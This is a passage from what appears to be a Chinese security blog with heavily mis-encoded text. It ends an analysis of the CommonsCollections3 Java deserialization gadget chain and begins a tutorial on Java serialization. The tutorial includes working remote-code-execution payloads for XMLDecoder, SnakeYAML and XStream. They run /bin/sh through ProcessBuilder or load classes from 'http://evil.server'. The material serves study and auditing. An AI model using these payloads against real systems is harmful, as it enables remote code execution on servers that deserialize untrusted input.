ConstantTransformer‰∏ä‰∏ÄÁØáÂ∑≤ÁªèËØ¥Ëøá‰∫ÜÔºåÂÖ∂transform‰ºöËøîÂõûÊûÑÈÄ†Êó∂ÁöÑÂØπË±°ÔºåËøôÈáåÂ∞±ÊòØTrAXFilter.classÂØπË±°„ÄÇ Êàë‰ª¨ÈáçÁÇπÊù•ÁúãInstaniateTransformerÁöÑtransformÂáΩÊï∞ ÁÆÄÂçïÊù•ÁúãÔºåËØ•ÂáΩÊï∞ÂØπËæìÂÖ•ÁöÑinputÔºàËøôÈáåÂ∞±ÊòØTrAXFilter.classÔºâÂÅöÂÆû‰æãÂåñÁöÑÊìç‰Ωú„ÄÇËøôÈáåÁúãËµ∑Êù•ÔºåÂÖ∂ÂÆûÊúâÁÇπÂÉèphp‰∏≠ÊâæÂØπÂ∫îÁöÑ__constructsÔºåÂú®JavaÈáåÊàë‰ª¨Â∞±ÂéªÊâæÊûÑÈÄ†ÂáΩÊï∞ÈáåÂÅö‰∫ÜÂç±Èô©Êìç‰ΩúÁöÑclass„ÄÇ Êù•Áúã‰∏Ä‰∏ãTrAXFilterÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞ ËøôÈáåÁöÑtemplatesÂ∞±ÊòØ‰∏äÈù¢exp‰∏≠ÊûÑÈÄ†ÁöÑtemplatesImpl. ÁªßÁª≠ÁúãTransformerImplÁöÑnewTransformerÂáΩÊï∞ org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481 ÁªßÁª≠ÁúãgetTransletInstance ÂÜçÁªßÁª≠defineTransletClasses ÁúãÂà∞ËøôÈáåÊòØ‰∏çÊòØÊúâÁÇπÁÜüÊÇâÔºåÊ≤°ÈîôÔºåËøôÈáåÁî®Âà∞‰∫Ü0x02‰∏≠ÁöÑ‰∏§‰∏™Âü∫Á°ÄÁü•ËØÜ„ÄÇdefineTransletClassesËøòÂéüÂá∫Á±ªÔºågetTransletInstanceËøõË°åÂÆû‰æãÂåñ„ÄÇÈÇ£‰πàÊàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™ÂêàÈÄÇÁöÑ_bytecodesÂç≥ÂèØÊâßË°å‰ªªÊÑèJava‰ª£Á†Å„ÄÇ ‰∏ãÈù¢Ë°•ÂÖÖ‰∏Ä‰∏ãÔºåÂú®ÊûÑÈÄ†expÊó∂ÈúÄË¶ÅÊª°Ë∂≥ÁöÑÊù°‰ª∂Ôºö Ê§çÂÖ•ÁöÑtemplates‰∏∫TransformerImplÁ±ªÔºå‰ªéËÄåË∞ÉÁî®ÂêéÁª≠ÁöÑnewTransformerÂáΩÊï∞ Ê§çÂÖ•ÁöÑtemplatesÂÆû‰æãÔºå_name‰∏ç‰∏∫null,_class‰∏∫null Ê§çÂÖ•ÁöÑtemplatesÂÆû‰æãÔºå_bytecodes‰∏ç‰∏∫null,_tfactory‰∏∫TransformerFactoryImplÂØπË±° Ê§çÂÖ•ÁöÑtemplates._bytecodesÊï∞ÁªÑÔºåÂÖ∂ÊúÄÁªàËøòÂéüÁöÑÂØπË±°Áà∂Á±ª‰∏∫com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ÈÇ£‰πàÊÄé‰πàÊâçËÉΩÊª°Ë∂≥Ëøô‰∫õÊù°‰ª∂Âë¢ÔºüËøôÈáåÁ•ûÂ•áÁöÑjavassistÂèàË¶Å‰∏äÂú∫Âï¶ÔºÅ Êù•Áúã‰∏Ä‰∏ãysoserialÁöÑÊìç‰Ωú ‰∏äÈù¢ÁöÑ‰ª£Á†Å‰∏çÂÅöÁúÅÁï•ÔºåÊàë‰ª¨Â∫îËØ•Â•ΩÂ•ΩÂ≠¶‰π†‰∏Ä‰∏ãjavassistÁöÑÂü∫Êú¨Êìç‰ΩúÔºå‰ª£Á†ÅÂèØ‰ª•Âú®Gadgets.createTemplatesImplÊâæÂà∞ÔºÅ ËøôÈáåÊ°Ü‰∫Ü‰∏§‰∏™Ê°ÜÔºåÁ¨¨‰∏Ä‰∏™Ê°ÜÊòØÈÄöËøájavassistÊ≥®ÂÖ•ÈùôÊÄÅÂùóÔºåÈùôÊÄÅÂùóÁöÑÂÜÖÂÆπÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÊâßË°åÁöÑÂëΩ‰ª§„ÄÇÁ¨¨‰∫å‰∏™Ê°ÜÊòØysoserailÊ°ÜÊû∂Ëá™Â∑±Â∞ÅË£ÖÁöÑ‰∏Ä‰∏™ÂèçÂ∞ÑÂ∑•ÂÖ∑Á±ªÔºåÈÄöËøáËøô‰∏™Á±ªÊàë‰ª¨ÂèØ‰ª•Âä®ÊÄÅÁöÑÊìç‰ΩútemplatesÂÆû‰æãÁöÑÁ±ªÂ±ûÊÄßÂÜÖÂÆπ„ÄÇËøôÈáå‰∏ªË¶ÅÂ∞±ÊòØÂú®Êª°Ë∂≥‰∏äËø∞ÁöÑÂá†‰∏™Êù°‰ª∂„ÄÇ ËøôÈáåÊúâ‰∏ÄÁÇπÂèØ‰ª•Êèê‰∏Ä‰∏ãÔºåËØ•Âà©Áî®ÈìæÁöÑ‰ΩúËÄÖÂú®Â°´ÂÖÖ_bytecodesÊó∂ÔºåÈ¢ùÂ§ñÂ°´ÂÖÖ‰∫Ü‰∏Ä‰∏™Êó†ÂÖ≥ÁöÑÁ±ª(‰∏äÂõæÁ¨¨130Ë°å)„ÄÇËøô‰∏™Á±ª‰∏ªË¶ÅÁî®‰∫éÊª°Ë∂≥_auxClasses,ËÆ©Ëøô‰∏™getTransletInstanceÂáΩÊï∞ËÉΩÊ≠£Â∏∏Ëµ∞ÂÆå„ÄÇ ÁªèËøá‰∏äÈù¢ÁöÑÂàÜÊûêÔºåÂÖ∂ÂÆûÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìgetTransletInstanceÁöÑÁ¨¨408Ë°åÔºåÂØπ_classÂÅöÂÆû‰æãÂåñÊó∂Êàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑ‰ª£Á†ÅÂ∞±Â∑≤ÁªèÊâßË°å‰∫Ü„ÄÇÊâÄ‰ª•ËøôÈáåÈ¢ùÂ§ñÂ°´ÂÖÖÁöÑÁ±ªÂÖ∂ÂÆûÊòØÂèØÊúâÂèØÊó†ÁöÑ„ÄÇ 0x04 ÊÄªÁªìÂà∞ËøôÈáåÔºåÊï¥‰∏Ä‰∏™CommonsCollections3Â∞±ÂàÜÊûêÁªìÊùü‰∫Ü„ÄÇ CommonsCollections3‰∏ªË¶ÅÂà©Áî®‰∫ÜÂèØÊéßÁöÑbyteÊï∞ÁªÑ‰ªédefineClassÂáΩÊï∞‰∏≠ËøòÂéüÂá∫ÊÅ∂ÊÑèÊûÑÈÄ†ÁöÑClass„ÄÇÂπ∂‰∏îÂú®ÂêéÁª≠ÁöÑË∞ÉÁî®‰∏≠ÔºåËøô‰∏™ClassË¢´Ê≥®ÂÖ•Âà∞ÂÜÖÂ≠ò‰∏≠Ôºå‰ªéËÄåÊâßË°å‰∫ÜÊ≥®ÂÖ•ÁöÑÈùôÊÄÅÂùóÁöÑ‰ª£Á†ÅÔºåÂÆûÁé∞‰∫Ü‰ªªÊÑèJava‰ª£Á†ÅÊâßË°å„ÄÇ Âà∞ËøôÁØá‰∏∫Ê≠¢ÔºåÊàë‰ª¨Â∑≤ÁªèÁü•ÈÅì‰∫Ü‰∏§ÁßçJavaÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÁöÑÊûÑÈÄ†ÊñπÂºè Âà©Áî®ÂèØÊéßÁöÑÂèçÂ∞ÑÊú∫Âà∂„ÄÇÂÖ∑‰ΩìÁöÑClass„ÄÅMethodÁ≠âÂùáÂèØÊéßÊó∂ÔºåÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂ÔºåÂèØ‰ª•ÊûÑÈÄ†Âá∫‰ªªÊÑèÁöÑÁ±ªË∞ÉÁî®„ÄÅÁ±ªÂáΩÊï∞Ë∞ÉÁî® Âà©Áî®ÂèØÊéßÁöÑdefineClassÂáΩÊï∞ÁöÑbyteÊï∞ÁªÑ„ÄÇÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑClassÂ≠óËäÇÁ†ÅÊï∞ÁªÑÔºåÂ∏∏‰∫éÈùôÊÄÅÂùóÊ≥®ÂÖ•ÊÅ∂ÊÑè‰ª£Á†Å 20191104 Ë°•ÂÖÖÂâçÈù¢ÁöÑÂàÜÊûêÂπ∂Ê≤°ÊúâÊèêÂà∞3.2.2ÁâàÊú¨ÂèëÁîü‰∫ÜÂï•‰∫ãÔºåÂØºËá¥‰∫ÜÂà©Áî®ÈìæÁöÑÂ§±ÊïàÔºåËøôÈáåÁÆÄÂçïÊèê‰∏Ä‰∏ã 3.2.2ÁâàÊú¨ÂØπInvokerTransformerÂ¢ûÂä†‰∫ÜreadObjectÂáΩÊï∞ÔºåÂπ∂‰∏îÂÅö‰∫ÜÊòØÂê¶ÂÖÅËÆ∏ÂèçÂ∫èÂàóÂåñÁöÑÊ£ÄÊü•ÔºåÂú®FunctorUtils.checkUnsafeSerializationÂáΩÊï∞ÂÜÖ„ÄÇ ËøôÈáåUNSAFE_SERIALIZABLE_PROPERTYÁöÑÂÄºÈªòËÆ§‰∏∫falseÔºåÂ¶ÇÊûúÈúÄË¶Å‰∏∫trueÔºåÈúÄË¶ÅÂú®ËøêË°åÊó∂ÊåáÂÆö„ÄÇ ÊâÄ‰ª•Âú®‰ΩøÁî®InvokerTransformer‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑ‰∏ÄÈÉ®ÂàÜÊó∂Ôºå‰ºöthrow‰∏Ä‰∏™exception„ÄÇÈô§‰∫ÜInvokerTransformerÁ±ªÂ§ñÔºåËøòÊúâCloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure„ÄÇÊâÄ‰ª•Âú®3.2.2ÁâàÊú¨‰ª•‰∏äÔºåÂü∫Êú¨‰∏äÂà©Áî®ÈìæÈÉΩÂ∑≤ÁªèÂ∫ü‰∫Ü„ÄÇ ÂΩìÁÑ∂ÔºåËøôÁßçÊñπÊ≥ïÊ≤ªÊ†á‰∏çÊ≤ªÊú¨ÔºåÂ¶ÇÊûúÂèØ‰ª•Âú®Ëøô‰∫õÁ±ª‰ª•Â§ñÔºåÊûÑÈÄ†‰∏Ä‰∏™Âà©Áî®ÈìæÂêåÊ†∑ÂèØ‰ª•ËææÂà∞ÂâçÈù¢ÁöÑÊïàÊûú„ÄÇ"},{"title":"„Äênotes„ÄëJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò‰πãCommonsCollections1","permalink":"http://blog.0kami.cn/2019/10/24/java/study-java-deserialized-commonscollections3-1/","text":"0x00 ÂâçË®Ä ÂâçÊÆµÊó∂Èó¥Âú®Â§çÁé∞shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑËøáÁ®ã‰∏≠ÔºåÂèëÁé∞Êó†Ê≥ïÂæàÂ•ΩÁöÑÁêÜËß£CommonCollections4‰∏∫‰ªÄ‰πàÊó†Ê≥ïÊâßË°åÂëΩ‰ª§ÔºåËøòÊòØÁº∫Â∞ëJavaÁöÑ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ„ÄÇÊâÄ‰ª•ËøôÈáåÂ∞±ÂÖàÂÅú‰∏ã‰∫ÜÂ§çÁé∞ÊºèÊ¥ûÁöÑËøõÁ®ãÔºåÂÖàÂ∞ÜÂü∫Á°ÄÊâìÊâéÂÆûÔºöÔºâ„ÄÇËøôÁØáÊñáÁ´†Â∞ÜËÆ∞ÂΩïÔºåJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂéüÁêÜ‰ª•ÂèäÊµãËØïÁéØÂ¢É„ÄÇ ÂèÇËÄÉÊñáÁåÆÈÉΩÂµåÂÖ•Âú®Êñá‰∏≠„ÄÇ 0x01 Âü∫Á°ÄÁü•ËØÜ1. Java‰∏≠ÁöÑÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÂ∫èÂàóÂåñÔºö‰ΩøÁî®ObjectOutputStreamÁ±ªÁöÑwriteObjectÂáΩÊï∞ 1public final void writeObject(Object x) throws IOException ÂèçÂ∫èÂàóÂåñÔºö‰ΩøÁî®ObjectInputStreamÁ±ªÁöÑreadObjectÂáΩÊï∞ 1public final Object readObject() throws IOException, ClassNotFoundException ÊîØÊåÅÂ∫èÂàóÂåñÁöÑÂØπË±°ÂøÖÈ°ªÊª°Ë∂≥Ôºö ÂÆûÁé∞‰∫Üjava.io.SerializableÊé•Âè£ ÂΩìÂâçÂØπË±°ÁöÑÊâÄÊúâÁ±ªÂ±ûÊÄßÂèØÂ∫èÂàóÂåñÔºåÂ¶ÇÊûúÊúâ‰∏Ä‰∏™Â±ûÊÄß‰∏çÊÉ≥Êàñ‰∏çËÉΩË¢´Â∫èÂàóÂåñÔºåÂàôÈúÄË¶ÅÊåáÂÆötransientÔºå‰ΩøÂæóËØ•Â±ûÊÄßÂ∞Ü‰∏ç‰ºöË¢´Â∫èÂàóÂåñ ‰∏æ‰∏™‰æãÂ≠ê(Êù•Ê∫ê‰∫éÊ≠§Â§Ñ) 123456789101112public class Employee implements java.io.Serializable&#123; public String name; public String address; public transient int SSN; public int number; public void mailCheck() &#123; System.out.println(\"Mailing a check to \" + name + \" \" + address); &#125;&#125; 1234567891011121314151617181920212223242526import java.io.*;public class SerializeDemo&#123; public static void main(String [] args) &#123; Employee e = new Employee(); e.name = \"Reyan Ali\"; e.address = \"Phokka Kuan, Ambehta Peer\"; e.SSN = 11122333; e.number = 101; try &#123; FileOutputStream fileOut = new FileOutputStream(\"/tmp/employee.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\"Serialized data is saved in /tmp/employee.ser\"); &#125;catch(IOException i) &#123; i.printStackTrace(); &#125; &#125;&#125; ËøêË°åÂêéÔºåÁîüÊàêemployee.ser Ê†πÊçÆÂ∫èÂàóÂåñËßÑËåÉÔºåaced‰ª£Ë°®javaÂ∫èÂàóÂåñÊï∞ÊçÆÁöÑmagic wordSTREAM_MAGIC,0005Ë°®Á§∫ÁâàÊú¨Âè∑STREAM_VERSION,73Ë°®Á§∫ÊòØ‰∏Ä‰∏™ÂØπË±°TC_OBJECT,72Ë°®Á§∫Ëøô‰∏™ÂØπË±°ÁöÑÊèèËø∞TC_CLASSDESC ÊâÄ‰ª•Âú®Êó•Â∏∏ÊµãËØï‰∏≠ÔºåÂ¶ÇÊûúËß£ÂºÄÁ±ª‰ººBase64ÂêéÔºåËµ∑Âßã‰∏∫acedÊâìÂ§¥ÔºåÂèØ‰ª•Â∞ùËØï‰ΩøÁî®ÂèçÂ∫èÂàóÂåñÁöÑpayload„ÄÇ Âú®ÂØπÂÖ∂ÂÅöÂÆåÂ∫èÂàóÂåñÊìç‰ΩúÂêéÔºåÊàë‰ª¨Âú®Âè¶‰∏Ä‰∏™JVM‰∏≠ÊÅ¢Â§çËØ•ÂØπË±°ÔºåÈúÄË¶ÅÁî®Âà∞ObjectInputStream 12345678910111213141516171819202122232425262728293031import java.io.*;public class DeserializeDemo&#123; public static void main(String [] args) &#123; Employee e = null; try &#123; FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); e = (Employee) in.readObject(); in.close(); fileIn.close(); &#125;catch(IOException i) &#123; i.printStackTrace(); return; &#125;catch(ClassNotFoundException c) &#123; System.out.println(\"Employee class not found\"); c.printStackTrace(); return; &#125; System.out.println(\"Deserialized Employee...\"); System.out.println(\"Name: \" + e.name); System.out.println(\"Address: \" + e.address); System.out.println(\"SSN: \" + e.SSN); System.out.println(\"Number: \" + e.number); &#125;&#125; readObjectÂáΩÊï∞ÂèçÂ∫èÂàóÂåñ‰∫Ü‰∏äÈù¢‰∫ßÁîüÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆÊµÅÔºåÁîüÊàê‰∫ÜÂéüÊúâÁöÑÂØπË±°Êï∞ÊçÆÁªìÊûÑ„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÁî±‰∫éSSN‰∏∫transientÔºåÂÖ∂Êó†Ê≥ïÂ∫èÂàóÂåñÔºåÊâÄ‰ª•ËøòÂéüÂêéÂÖ∂ÂÄº‰∏∫0„ÄÇ Â¶ÇÊûúÂú®ÂæÖÂ∫èÂàóÂåñÁ±ª‰∏äÂÆûÁé∞‰∫ÜreadObjectÂáΩÊï∞ÔºåÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠‰ºöËá™Âä®Ë∞ÉÁî®ËØ•Á±ªÁöÑreadObjectÂáΩÊï∞„ÄÇ ‰æãÂ¶ÇÂú®EmployeeÁ±ª‰∏≠Ê∑ªÂä†ÂáΩÊï∞readObject 1234private void readObject(ObjectInputStream in) throws Exception &#123; in.defaultReadObject(); System.out.println(\"Employee call readObject Function\");&#125; Âú®ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠Â∞ÜË∞ÉÁî®ËØ•ÂáΩÊï∞ 2. ÂèçÂ∫èÂàóÂåñËß¶ÂèëÁÇπÊâ©Â±ï‰∏äÈù¢Â±ïÁ§∫‰∫ÜÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁöÑÂéüÁêÜÔºåÂπ∂‰∏îÂèçÂ∫èÂàóÂåñÁöÑËß¶ÂèëÁÇπ‰∏∫ObjectInputStream.readObject„ÄÇÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåÊòØÂê¶JavaÂèçÂ∫èÂàóÂåñÂè™ËÉΩÁî±ËØ•ÁÇπËß¶ÂèëÔºüÁ≠îÊ°àÂΩìÁÑ∂ÊòØÂê¶ÂÆöÁöÑ„ÄÇ Èô§‰∫Ü‰∏äÈù¢ÁöÑÊñπÊ≥ïÂ§ñÔºåËøòÊúâÂ¶Ç‰∏ãÂá†ÁßçËß¶ÂèëÊñπÂºèÔºö 1234567ObjectInputStream.readObject// ÊµÅËΩ¨Âåñ‰∏∫ObjectObjectInputStream.readUnshared // ÊµÅËΩ¨Âåñ‰∏∫ObjectXMLDecoder.readObject // ËØªÂèñxmlËΩ¨Âåñ‰∏∫ObjectYaml.load// yamlÂ≠óÁ¨¶‰∏≤ËΩ¨ObjectXStream.fromXML// XStreamÁî®‰∫éJava Object‰∏éxmlÁõ∏‰∫íËΩ¨ÂåñObjectMapper.readValue// jackson‰∏≠ÁöÑapiJSON.parseObject// fastjson‰∏≠ÁöÑapi Note: ÂØπ‰∫éreadUnsharedÂáΩÊï∞ÔºåÂÖ∂‰∏éreadObjectÂáΩÊï∞ÁöÑÂå∫Âà´ÊöÇÊó∂ËøòÊ≤°ÂºÑÊòéÁôΩÔºåÂºïÁî®ÁΩë‰∏äÁöÑËß£Èáä readUnsharedÊñπÊ≥ïËØªÂèñÂØπË±°Ôºå‰∏çÂÖÅËÆ∏ÂêéÁª≠ÁöÑreadObjectÂíåreadUnsharedË∞ÉÁî®ÂºïÁî®ËøôÊ¨°Ë∞ÉÁî®ÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÂØπË±°ÔºåËÄåreadObjectËØªÂèñÁöÑÂØπË±°ÂèØ‰ª•„ÄÇ ‰ΩÜÂÖ∂ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠‰ªçÁÑ∂ÂèØ‰ª•Ëß¶ÂèëreadObjectÁöÑË∞ÉÁî®ÔºåÊúâÂæÖÂºÑÊ∏ÖÊ•ö„ÄÇ 3. Êâ©Â±ïËß¶ÂèëÁÇπËØïÈ™åreadUnsharedÂáΩÊï∞ÁöÑ‰ΩøÁî®ÊñπÂºèÂêåreadObjectÁ±ª‰ººÔºåËøôÈáå‰∏çÂÜçÂèôËø∞„ÄÇËøô‰∏ÄÂ∞èËäÇ‰∏ªË¶ÅËÆ≤ÂêÑÁßçËß¶ÂèëÁÇπÁöÑÂà©Áî®ÊñπÂºèÔºå‰∏çËÆ≤ÂÖ∑‰ΩìÁöÑÂéüÁêÜ„ÄÇÂéüÁêÜÈÉ®ÂàÜÁïôÂà∞ÂêéÈù¢ÂàÜÊûê„ÄÇ a. XMLDecoder.readObject1234567891011public static void main(String[] args)&#123; String poc = \"poc.xml\"; try &#123; FileInputStream file = new FileInputStream(poc); XMLDecoder decoder = new XMLDecoder(file); decoder.readObject(); decoder.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125;&#125; poc.xml 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;java&gt; &lt;object class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/sh&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;open /Applications/Calculator.app&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt; &lt;/object&gt;&lt;/java&gt; ÊúÄÁªàÂèØËß¶ÂèëÂëΩ‰ª§ÊâßË°å b. Yaml.loadÂèÇËÄÉÈìæÊé•ÔºåËøôÈáåÊöÇÊú™ËØïÈ™å Ê∑ªÂä†SnakeYAMLÂ∫ì 123456&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.25&lt;/version&gt;&lt;/dependency&gt; 123456public static void main(String[] args) &#123; String yamlStr = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \" + \"[[!!java.net.URL [\\\"http://evil.server\\\"]]]]\"; Yaml yaml = new Yaml(); Object obj = yaml.load(yamlStr);&#125; ËøôÈáåÁöÑyamlStrÂèØ‰ª•Áî®https://github.com/mbechler/marshalsecÁîüÊàêÂç±ÂÆ≥Êõ¥Â§ßÁöÑpayload c. XStream.fromXMLÂèÇËÄÉÈìæÊé• Ê∑ªÂä†XStreamÂ∫ì 12345&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.10&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021public static void main(String[] args) &#123;// expGen(); String payload = \"&lt;sorted-set&gt;\\n\" + \" &lt;string&gt;foo&lt;/string&gt;\\n\" + \" &lt;dynamic-proxy&gt;\\n\" + \" &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" + \" &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" + \" &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" + \" &lt;command&gt;\\n\" + \" &lt;string&gt;/bin/sh&lt;/string&gt;\\n\" + \" &lt;string&gt;-c&lt;/string&gt;\\n\" + \" &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\\n\" + \" &lt;/command&gt;\\n\" + \" &lt;/target&gt;\\n\" + \" &lt;action&gt;start&lt;/action&gt;\"+ \" &lt;/handler&gt;\\n\" + \" &lt;/dynamic-proxy&gt;\\n\" + \"&lt;/sorted-set&gt;\\n\"; XStream xStream = new XStream(); xStream.fromXML(payload); &#125; d. ‰∏äÈù¢ÁöÑ6Âíå7ÔºåÁïôÂà∞ÂêéÈù¢ÂàÜÊûê4. Â∞èÁªì‰∏äÈù¢‰∏§ËäÇ‰ªãÁªç‰∫ÜJavaÂèçÂ∫èÂàóÂåñÁöÑÂéüÁêÜÔºåÂπ∂Êâ©Â±ï‰∫ÜÂèçÂ∫èÂàóÂåñÁöÑËß¶ÂèëÁÇπ„ÄÇÂú®ÂÆûÈôÖÁöÑÂÆ°ËÆ°ËøáÁ®ã‰∏≠ÔºåÂèØ‰ª•Áõ¥Êé•ÂÖ≥Ê≥®Ëøô‰∫õÂáΩÊï∞ÁöÑË∞ÉÁî® 1(readObject|readUnshared|load|fromXML|readValue|parseObject)\\s*\\( ÂΩìÁÑ∂Êúâ‰∫õËøòÈúÄË¶ÅÁúãÊòØÂê¶ÊòØÊúâÊºèÊ¥ûÁöÑÁâàÊú¨ 0x02 ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏äÈù¢Â§ßËá¥ËÆ≤ËØâ‰∫ÜÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºåÊú¨ËäÇÂ∞ÜË∞ÉËØï‰∏äÈù¢ÁöÑEmployeeÊ°à‰æãÔºåÊù•ÁúãÁúãÂú®‰ª£Á†ÅÂ±ÇÈù¢ÂèçÂ∫èÂàóÂåñËøáÁ®ãÊòØÊÄé‰πàÊ†∑ÁöÑÔºÅ ËøôÈáå‰ΩøÁî®ÁöÑÊòØObjectInputStreamÁöÑÂèçÂ∫èÂàóÂåñÊñπÊ≥ïreadObjectÂáΩÊï∞ ÂÖ∂ÂÆûÊï¥‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñËøáÁ®ãÊÄª‰ΩìÊù•ËØ¥ÂàÜ‰∏∫‰∏§Ê≠•Ôºå‰ªéÂ≠óÁ¨¶‰∏≤ÊµÅ‰∏≠Ê†πÊçÆÂ∫èÂàóÂåñËßÑÊ†ºÊèêÂèñÂá∫ÂèØËÉΩÁöÑÁ±ªÔºåÁÑ∂ÂêéÂ∞ÜËØ•Á±ª‰ΩøÁî®ÂèçÂ∞ÑÊú∫Âà∂Êü•ÊâæÊàñÂàõÂª∫‰∏Ä‰∏™ÂÆû‰æã„ÄÇÂÖ∂‰∏≠‰πü‰ºöÊúâ‰∏Ä‰∫õÊ£ÄÊü•ÁöÑËøáÁ®ãÔºåËøôÈáå‰æãÂ≠êÊØîËæÉÁÆÄÂçïÔºå‰∏çÂèôËø∞„ÄÇ Êù•Áúã‰∏Ä‰∏ãÊü•ÊâæÊàñÂàõÂª∫ÁöÑËøáÁ®ã ObjectInputStream:readObject:417 Ë∑üËøõObjectInputStreamÁöÑreadObjectÁ±ªÔºåËØ•ÂáΩÊï∞‰ΩìÁé∞‰∫ÜÊï¥‰∏™ÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ãÔºåÂÖ∂‰∏≠ÂÖ∂‰∏ªË¶ÅÂäüËÉΩÁöÑÊòØreadObject0ÂáΩÊï∞ ObjectInputStream:readObject0:1515 ‰ªéÊµÅ‰∏≠ËØªÂèñÂá∫ÂΩìÂâçÁöÑÁ±ªÂûãÔºåtc=115Ê≠§Êó∂‰ª£Ë°®ObjectÂØπË±°Ôºå‰ªéËÄåËøõÂÖ•readOrdinaryObject ObjectInputStream:readOrdinaryObject:2026 ËØ•ÂáΩÊï∞‰∏ªË¶ÅÂÅö‰∫ÜÂÆû‰æãÂåñÂØπË±°ÁöÑÂ∑•‰ΩúÔºåÂÖ∂‰∏≠2033Ë°åÁîüÊàêÁöÑObjectStreamClassÂØπË±°Ôºå‰ºöÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂ÂÆû‰æãÂåñÂ∫èÂàóÂåñÊµÅ‰∏≠ÁöÑÂØπË±°„ÄÇ2044Ë°åÂÆûÈôÖÁöÑËé∑ÂèñÂà∞ËØ•ÂØπË±°„ÄÇ ÂÖ≥‰∫éObjectStreamClassÁöÑÂäüËÉΩÔºåÂÆÉÊòØÁ±ªÁöÑÂ∫èÂàóÂåñÊèèËø∞Âô®ÔºåÂåÖÂê´Á±ªÁöÑÂêçÂ≠óÂíåÂ∫èÂàóÁâàÊú¨Âè∑„ÄÇ‰ΩøÁî®ÂÆÉÁöÑlookupÂáΩÊï∞ÂèØ‰ª•ËΩΩÂÖ•ÊàñÊñ∞Âª∫ËØ•Á±ªÔºå‰ΩÜËøôÈáåÂÆûÈôÖ‰∏äÁî®ÁöÑÊòØnewInstanceÊù•ÂÆû‰æãÂåñÂΩìÂâçÁöÑÂ∫èÂàóÂåñÊèèËø∞Âô®ÔºåÂç≥‰∫ßÁîüÂΩìÂâçÊèèËø∞Âô®Êåá‰ª£ÁöÑÁ±ª„ÄÇ Serialization‚Äôs descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method. ÂÖ∂‰∏≠ÂáΩÊï∞readClassDescÂ∞Ü‰ªéÂ∫èÂàóÂåñÊµÅ‰∏≠ÊèêÂèñÂá∫Áõ∏ÂÖ≥ÁöÑÁ±ª‰ø°ÊÅØ„ÄÇËøôÈáåÂ∞±Áõ¥Êé•ÁúãÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂Ëé∑ÂèñÂà∞Á±ªÁöÑÂú∞ÊñπÔºå‰Ωç‰∫éObjectInputStream.resolveClassÔºå‰∏ãÂõæ‰∏∫Ë∞ÉÁî®Èìæ ObjectInputStream:resolveClass:677 ËøôÈáåÊèêÂèñ‰∫Üjvm‰∏≠ÂΩìÂâçËøô‰∏™ÊµÅ‰∏≠ÁöÑÁ±ªÁöÑClassÂØπË±°ÔºåÁî®‰∫éÂêéÁª≠ÁöÑnewInstance„ÄÇ 